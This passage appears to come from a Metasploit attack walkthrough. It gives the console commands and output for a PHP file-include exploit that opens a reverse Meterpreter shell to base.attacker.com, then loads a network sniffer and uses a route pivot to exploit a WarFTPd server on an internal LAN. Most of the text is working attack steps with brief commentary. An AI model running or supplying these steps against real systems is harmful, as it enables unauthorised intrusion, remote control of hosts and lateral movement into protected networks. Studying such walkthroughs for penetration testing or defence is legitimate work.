/-----------------------------------------------------------------------------------------------/
It allows you to manipulate the file system and therefore to upload an executable file and run it




msf > use exploit/unix/webapp/php_include

msf exploit(php_include) > set phpuri /index.php?page=XXpathXX

msf exploit(php_include) > set rhost web.test.com

msf exploit(php_include) > set payload php/meterpreter/reverse_tcp

msf exploit(php_include) > set lhost base.attacker.com

msf exploit(php_include) > exploit

[*] Started reverse handler on base.attacker.com:4444

[*] Using URL: http://base.attacker.com:8080/fHYxfNlfsyZV

[*] Local IP: http://base.attacker.com:8080/fHYxfNlfsyZV

[*] PHP include server started.

[*] Sending stage (29387 bytes) to 127.0.0.1

[*] Meterpreter session 2 opened (127.0.0.1:4444 -> 127.0.0.1:59550) at Mon Sep 25 11:59:28 +0200 2010

meterpreter > getuid

Server username: Administrateur (0)

/----------------------------------------------------------------------------------------------------------/


          Sniffing








meterpreter > use sniffer

Loading extension sniffer...success.



/-----------------------------------------------------------------------------------/

Since the two vulnerable hosts are located in the LAN protected by a firewall
it is impossible to attack them directly like other operating frameworks,
metasploit can pivot from a compromised machine. 
This pivot (route command) routes commands executed from metasploit through a previously opened session.





meterpreter >

Background session 4? [y/N] y

msf exploit(handler) > route add 192.168.145.0 255.255.255.0 4

msf exploit(handler) > use exploit/windows/ftp/warftpd_165_user

msf exploit(warftpd_165_user) > set rhost 192.168.145.22

msf exploit(warftpd_165_user) > set payload windows/meterpreter/reverse_https

msf exploit(warftpd_165_user) > set lport 8443

msf exploit(warftpd_165_user) > exploit